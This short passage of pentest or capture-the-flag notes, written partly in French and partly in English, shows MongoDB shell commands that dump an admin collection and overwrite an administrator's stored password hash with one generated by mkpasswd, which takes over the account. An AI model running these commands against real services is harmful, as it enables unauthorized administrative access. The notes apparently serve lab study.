Le service tourne sur la machine sur le port 27117

Interragir avec MongoDB

```sh
mongo --port 27117 [DATABASE] --eval "db.admin.find().forEach(printjson);"
```

Let's proceed to replacing the existing hash with the one we created.

```sh
mkpasswd -m sha-512 Password1234
```

```sh
mongo --port 27117 [DATABASE] --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512_HASH_GENERATED"}})'
```


